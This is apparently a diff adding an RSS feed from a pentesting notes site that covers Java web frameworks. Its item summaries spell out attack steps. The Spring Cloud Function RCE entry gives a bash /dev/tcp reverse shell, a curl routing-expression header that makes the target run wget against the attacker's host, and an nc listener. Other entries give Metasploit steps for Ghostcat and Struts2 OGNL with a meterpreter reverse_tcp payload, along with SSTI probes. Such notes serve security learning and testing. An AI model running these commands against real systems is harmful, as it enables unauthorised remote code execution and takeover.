@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Java on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/web/framework/java/</link>
+    <description>Recent content in Java on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 16:14:30 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/web/framework/java/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Spring Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</link>
+      <pubDate>Fri, 15 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</guid>
+      <description>Framework Detection linkIf we get the Whitelabel Error Page, the website may use Spring Boot.&#xA;Enumeration linkDirectory Discovery link ffuf -u https://example.com/FUZZ -w seclists/Discovery/Web-Content/spring-boot.txt SSTI linkDiscovery linkIf there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the server-side template injection.&#xA;Try them:&#xA;2*2 #{2*2} *{2*2} Then you can also check more about that.</description>
+    </item>
+    <item>
+      <title>Spring Cloud Function RCE</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/java/spring-cloud-function-rce/</link>
+      <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/spring-cloud-function-rce/</guid>
+      <description>Exploitation linkReverse Shell linkFirst create a reverse shell script in local machine.&#xA;#!/bin/bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 Then start a web server for uploading it.&#xA;python3 -m http.server Now remote code execution with target website as below.&#xA;curl -X POST https://example.com:8080/functionRouter -H &amp;#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&amp;#34;wget http://10.0.0.1/shell -O /tmp/shell&amp;#34;)&amp;#39; --data-raw &amp;#39;data&amp;#39; -v Our reverse shell script is uploaded.&#xA;Start a listener in local machine.&#xA;nc -lvnp 4444 Remote code execution again to reverse shell.</description>
+    </item>
+    <item>
+      <title>AJP (Apache JServ Protocol) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/java/ajp-pentesting/</link>
+      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/ajp-pentesting/</guid>
+      <description>Enumeration link nmap --script ajp-auth -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-auth --script-args ajp-auth.path=/login -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-brute -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-headers -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-methods -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-request -p 8009 &amp;lt;target-ip&amp;gt; Ghostcat File Inclusion linkIt&amp;rsquo;s a vulnerability of Tomcat AJP (CVE-2020-1938).&#xA;Use Metasploit for exploiting it.&#xA;msfconsole msf6 &amp;gt; use auxiliary/admin/http/tomcat_ghostcat msf6 auxiliary(admin/http/tomcat_ghostcat) &amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf6 auxiliary(admin/http/tomcat_ghostcat) &amp;gt; exploit </description>
+    </item>
+    <item>
+      <title>Apache Struts Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/java/apache-struts-pentesting/</link>
+      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/apache-struts-pentesting/</guid>
+      <description>Struts2 OGNL Elavasion linkMetasploit is useful for exploiting.&#xA;msfconsole msf &amp;gt; use multi/http/struts2_content_type_ognl msf &amp;gt; set payload linux/x86/meterpreter/reverse_tcp msf &amp;gt; exploit meterpreter &amp;gt; shell SHELL=/bin/bash script -q /dev/null </description>
+    </item>
+  </channel>
+</rss>
